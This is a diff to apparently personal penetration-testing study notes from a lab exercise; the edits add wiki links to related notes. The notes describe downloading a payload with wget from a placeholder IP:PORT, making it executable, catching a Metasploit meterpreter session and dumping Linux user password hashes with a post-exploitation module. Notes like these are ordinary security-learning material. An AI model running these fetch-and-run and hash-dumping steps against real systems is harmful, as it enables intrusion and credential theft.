@@ -34,7 +34,7 @@ On the target machine, I fetched the onepiece.elf payload via
 `wget http://IP:PORT/onepiece.elf`
 
 Afterwards, I had to ensure that this field could execute. On Linux, this is
-`chmod +x filename`
+[[2026-01-22 Unix File Permissions and chmod|chmod]] `+x filename`
 (explicitly -> `chmod +x ./filename`)
 
 Attacking machine: set up a handler to listen 
@@ -48,12 +48,12 @@ Target machine can now run the payload
 After target machine runs payload, the handler listens
 meterpreter session is now successfully set up on target machine
 
-Backgrounded the current session, now we are back in msfconole
+Backgrounded the current session, now we are back in msfconole (see [[2026-01-04 Metasploit Modules and Commands|Metasploit modules]] for module usage)
 
 Using post exploit module that can dump hashes of the users -> I used `post/linux/gather/hashdump`
 Set options as required (SESSION -> 1)
 
-ran the module, successfully extracted user hashes
+ran the module, successfully extracted user hashes (see [[2026-01-03 John the Ripper Hash Cracking|hash cracking]] for next steps)
 ```
 msf6 post(linux/gather/hashdump) > sessions
 
